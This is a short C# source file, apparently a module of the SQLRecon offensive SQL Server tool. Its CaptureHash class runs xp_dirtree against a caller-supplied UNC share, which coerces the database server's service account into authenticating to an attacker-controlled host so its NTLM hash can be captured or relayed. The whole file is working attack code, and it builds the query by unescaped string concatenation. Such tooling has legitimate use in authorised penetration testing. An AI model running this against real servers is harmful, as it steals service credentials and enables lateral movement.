using System;
using System.Collections.Generic;
using System.Data.SqlClient;

namespace SQLRecon.Modules
{
    public class CaptureHash
    {
        public CaptureHash(SqlConnection con, String share)
        {
            initialize(con, share);
        }

        // this takes a file share (\\ip\share) and requests the share directly from the sql server
        public void initialize(SqlConnection con, String share)
        {
            SqlCommand command = new SqlCommand("EXEC master..xp_dirtree \"" + share + "\";", con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
        } //end initialize
    }
}
